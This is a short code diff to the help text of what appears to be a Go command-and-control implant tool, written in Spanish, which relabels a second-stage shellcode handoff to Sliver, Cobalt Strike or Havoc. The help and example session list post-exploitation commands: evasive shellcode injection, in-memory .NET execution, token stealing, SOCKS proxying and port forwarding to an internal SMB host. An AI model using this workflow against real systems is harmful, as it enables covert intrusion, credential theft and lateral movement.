@@ -2440,7 +2440,7 @@ func printHelp() {
   inject-apc <sc.bin> [proc]         APC early-bird (evasivo)
   dotnet-asm <asm.exe> [proc]        .NET assembly en memoria
   forkrun <sc.bin> [proc]            shellcode en proceso sacrificial
-  stage2 <sc.bin>                    handoff shellcode a framework secundario
+  stage2 <sc.bin>                    handoff a Sliver/CS/Havoc
   bof <nombre|archivo.o> [args]      ejecutar BOF
   bof list / bof install             listar / descargar colecciones
   token whoami|steal <pid>|make <u> <p>|drop
@@ -2583,8 +2583,8 @@ OPERAR:
   c2 [abc12345]> token steal 1234
   c2 [abc12345]> socks 1080
   c2 [abc12345]> portfwd add 4444 10.10.10.5 445
-  c2 [abc12345]> inject 4321 /tmp/stage2.bin
-  c2 [abc12345]> stage2 /tmp/stage2.bin
+  c2 [abc12345]> inject 4321 /tmp/sliver.bin
+  c2 [abc12345]> stage2 /tmp/sliver.bin
   c2 [abc12345]> cleanup
 
 `)
